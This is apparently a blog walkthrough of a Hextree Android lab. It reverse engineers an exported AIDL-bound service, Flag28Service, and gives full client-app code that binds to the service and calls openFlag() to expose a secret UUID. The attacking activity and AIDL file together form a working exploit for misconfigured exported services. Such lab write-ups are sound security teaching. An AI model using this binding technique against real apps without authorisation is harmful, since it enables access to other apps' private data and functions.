---
title: Flag28Service AIDL Binding Walkthrough (Hextree Lab)
description: A step-by-step guide to reverse engineering and exploiting an exported Android AIDL-based bound Service from another app.
summary: A step-by-step guide to reverse engineering and exploiting an exported Android AIDL-based bound Service from another app.
date: 2025-06-15  
tags:
- android  
- aidl  
- binder  
- reverse engineering 
- inter-process communication 
- hextree  
- penetration testing  
- android security  
read_time: 3 minute read
---

# Flag28Service AIDL Binding Walkthrough (Hextree Lab)

## 📌 Lab Objective

The goal of this Hextree challenge is to interact with an **exported bound Android service** (`Flag28Service`) from a different app (our attacking app) by leveraging **AIDL (Android Interface Definition Language)**. Once the AIDL interface is properly bound and invoked, a flag activity is launched containing a secret UUID.

---

## 🔍 Reconnaissance

Inspecting the AndroidManifest of the target app, we find this service:

```xml
<service
    android:name="io.hextree.attacksurface.services.Flag28Service"
    android:enabled="true"
    android:exported="true"/>
````

✅ The `android:exported="true"` line means any app on the device can bind to this service — if it knows how.

---

## 🧠 Understanding the Service Code

Here’s what `Flag28Service.java` does:

```java
public class Flag28Service extends Service {
    public static String secret = UUID.randomUUID().toString();
    private final IFlag28Interface.Stub binder = new IFlag28Interface.Stub() {
        @Override
        public boolean openFlag() throws RemoteException {
            return success();
        }

        public boolean success() {
            Intent intent = new Intent();
            intent.setClass(Flag28Service.this, Flag28Activity.class);
            intent.putExtra("secret", Flag28Service.secret);
            intent.addFlags(268468224);
            intent.putExtra("hideIntent", true);
            Flag28Service.this.startActivity(intent);
            return true;
        }
    };

    @Override
    public IBinder onBind(Intent intent) {
        Log.i("Flag28Service", Utils.dumpIntent(this, intent));
        return this.binder;
    }
}
```

* When `openFlag()` is called, it launches `Flag28Activity` with the `secret` in the intent.
* That function is exposed via **AIDL**.

---

## 🔧 Step-by-Step Exploit via AIDL

### 1. 🔎 Get the AIDL Definition

From decompiled code, we extract the AIDL interface:

```java
package io.hextree.attacksurface.services;

interface IFlag28Interface {
    boolean openFlag();
}
```

Create this file in your client app:

```
app/src/main/aidl/io/hextree/attacksurface/services/IFlag28Interface.aidl
```

> 📚 [AIDL Documentation](https://developer.android.com/guide/components/aidl)

Then rebuild the project. This will generate a stub interface your app can use to call the service.

### 2. 🏗️ Create a Client App to Bind to the Service

No special permission is needed to bind to exported services.

#### `HextreeActivity.java`

```java
public class HextreeActivity extends AppCompatActivity {
    boolean isBound = false;
    IFlag28Interface remoteservice;

    ServiceConnection connection = new ServiceConnection() {
        public void onServiceConnected(ComponentName name, IBinder service) {
            remoteservice = IFlag28Interface.Stub.asInterface(service);
            isBound = true;
            sendMessageToService();
        }

        public void onServiceDisconnected(ComponentName name) {
            isBound = false;
            remoteservice = null;
        }
    };

    public void sendMessageToService() {
        if (!isBound) return;
        try {
            remoteservice.openFlag();
        } catch (RemoteException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button attackButton = findViewById(R.id.attack);
        attackButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag28Service");
            bindService(intent, connection, Context.BIND_AUTO_CREATE);
        });
    }

    @Override
    protected void onDestroy() {
        if (isBound) {
            unbindService(connection);
            isBound = false;
        }
        super.onDestroy();
    }
}
```

#### Layout: `activity_main.xml`

```xml
<Button
    android:id="@+id/attack"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="Launch Flag Service" />
```

---

## 🧪 Testing the Attack

1. Install the vulnerable target app.
2. Install and run your client app.
3. Tap the button → it binds to the service.
4. Calls `openFlag()` → starts `Flag28Activity` with the flag.

🎉 You now have access to the secret UUID stored statically in the service.

---

## 🔐 Why This Works

* **AIDL** enables IPC in Android. If a service is exported and implements an AIDL interface, **any app can use it** — as long as it has the correct `.aidl` definition.
* The Binder framework ensures capability-based access, so possession of the IBinder gives you the power to call the methods.

---

## 📚 Resources

* [Android AIDL Guide](https://developer.android.com/guide/components/aidl)
* [Binder Internals (Google)](https://android.googlesource.com/platform/frameworks/native/+/refs/heads/main/cmds/servicemanager/README.md)
* [Binder IPC Deep Dive](https://dev.to/paulshen/android-ipc-binder-introduction-1e4c)
* Hextree CTF Labs – Android IPC + Reverse Engineering Challenges

---

## 🧠 Notes for Real-World Testing

* Always check for `exported=true` in the target app's `AndroidManifest.xml`.
* Decompile APKs using tools like jadx or apktool to extract `.aidl` files.
* Verify if the service performs security checks (e.g., caller package, signature).

---

## ✅ Summary

This lab demonstrates how exported AIDL-based services can become attack surfaces. By reverse engineering the `.aidl`, replicating it, and binding from your own app, you can trigger privileged flows like opening hidden activities or leaking secrets — all by using Binder IPC correctly.

> The power of Android IPC becomes a vulnerability when misconfigured.